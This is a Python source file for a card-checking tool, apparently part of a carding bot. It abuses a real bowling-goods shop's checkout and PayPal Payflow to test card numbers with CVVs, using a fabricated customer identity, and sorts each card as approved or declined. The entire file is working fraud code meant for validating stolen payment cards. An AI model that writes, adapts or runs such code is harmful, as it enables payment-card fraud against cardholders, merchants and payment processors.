from all.configs._def_main_ import *

async def Payflowavs(cc, mes, ano, cvv,):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)

    async with aiohttp.ClientSession(connector=conn,) as session:
        rand1 = random.randint(100,999)
        rand2 = random.randint(100,999)
        try:
            splitter = cc.split('|')
            ccnum    = splitter[0]
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Referer': 'https://inkjetsclub.com/brother-lc103-black-ink-cartridge.html',
                'Connection': 'keep-alive',
                'Cookie': 'wp_customerGroup=NOT%20LOGGED%20IN; wz.uid=Y2ZWw963T1f8j11J295a163S7; _ga=GA1.1.1546320771.1656199114; wz.data=%7B%22lastPrtTS%22%3A1656201327887%2C%22sessions%22%3A%7B%2296NNIg6p15M329G1m53g711Zr%22%3A1%7D%7D; SREC_SESSION=V1.1656199121694; private_content_version=21b5352834faf2ceb21b895aa1cf0558; mage-banners-cache-storage=%7B%7D; PHPSESSID=8354d82vv7pe4dkdg90au8gfna; _ga_FRZLFQS7JN=GS1.1.1656773135.1.1.1656773175.0; form_key=dFZ3zYEEF4HGRore; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; form_key=dFZ3zYEEF4HGRore; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; section_data_ids=%7B%22cart%22%3A1656773170%2C%22directory-data%22%3A1656773170%2C%22gtm%22%3A1656773170%7D',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
            })
            async with session.get('https://www.keepsakebowling.com/checkout/cart/',) as resp:
                print("[ + ] Req 1 Complete")
                try :          
                    soup_response = await resp.text()
                    soup = BeautifulSoup(soup_response , 'lxml')
                    form_key = soup.find("input", {"name": "form_key"})["value"]
                    cartid = 'Xha0sfRdoBa2JBg06yZZ9Z3MMoKGL62g'
                except UnboundLocalError or TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            
            data = {
                "cartId":"Xha0sfRdoBa2JBg06yZZ9Z3MMoKGL62g",
                "paymentMethod":{
                    "method":"payflowpro",
                    "additional_data":{
                        "cc_type":"MC",
                        "cc_exp_year": ano,
                        "cc_exp_month": mes,
                        "cc_last_4": ccnum[-4:]
                    }
                },
                "email":f"JoanBaldezTruco{random.randint(1000,9999)}@gmail.com",
                "billingAddress":{
                    "countryId":"US",
                    "regionId":"55",
                    "regionCode":"FL",
                    "region":"Florida",
                    "street":[
                        "1920 street"
                    ],
                    "company":"",
                    "telephone":"7859097876",
                    "postcode":"33130",
                    "city":"Miami",
                    "firstname":"Joan",
                    "lastname":"Baldez",
                    "saveInAddressBook":None
                }
            }   
            async with session.post(f'https://www.keepsakebowling.com/rest/default/V1/guest-carts/{cartid}/set-payment-information', json=data,) as resp:
                print("[ + ] Req 2 Complete")
                try :
                    response = await resp.text()
                except UnboundLocalError:
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                except TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'

            data = [
                ('form_key', form_key),
                ('captcha_form_id', 'payment_processing_request'),
                ('payment[method]', 'payflowpro'),
                ('billing-address-same-as-shipping', 'on'),
                ('captcha_form_id', 'co-payment-form'),
                ('controller', 'checkout_flow'),
                ('cc_type', 'MC'),
            ]
            async with session.post('https://www.keepsakebowling.com/paypal/transparent/requestSecureToken/', data=data,) as resp:
                print("[ + ] Req 3 Complete")

                try :          
                    rep = await resp.json()
                    securetoken   = rep['payflowpro']['fields']['securetoken']
                    securetokenid = rep['payflowpro']['fields']['securetokenid']
                except UnboundLocalError:
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                except TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
            data = {
                'result': '0',
                'securetoken': securetoken,
                'securetokenid': securetokenid,
                'respmsg': 'Approved',
                'result_code': '0',
                'csc': cvv,
                'expdate': f"{mes}{ano[2:4]}",
                'acct': ccnum,
            }
            async with session.post('https://payflowlink.paypal.com/', data=data,) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                except UnboundLocalError:
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'            
                except TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'  

            if int(response.find('name="PROCCVV2"')) > 0 :
                if (int(response.find('Verified')) > 0) or (int(response.find('CVV2 Mismatch')) > 0) or (int(response.find('Insufficient funds available')) > 0):
                    AVSDATA = soup.find("input", {"name": "AVSDATA"})["value"]
                    PROCCVV2 = soup.find("input", {"name": "PROCCVV2"})["value"]
                    RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                    await session.close()
                    return "Approved", RESPMSG, AVSDATA, PROCCVV2
                else :
                    AVSDATA = soup.find("input", {"name": "AVSDATA"})["value"]
                    PROCCVV2 = soup.find("input", {"name": "PROCCVV2"})["value"]
                    RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                    await session.close()
                    return "Declined", RESPMSG, AVSDATA, PROCCVV2
            elif (int(response.find('Verified')) > 0) or (int(response.find('CVV2 Mismatch')) > 0) or (int(response.find('Insufficient funds available')) > 0):
                RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                await session.close()
                return "ApprovedSinCVV", RESPMSG
            elif (int(response.find('name="RESPMSG"')) > 0):
                RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                await session.close()
                return "DeclinedSinCVV", RESPMSG
            else :
                await session.close()
                print(response)
                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"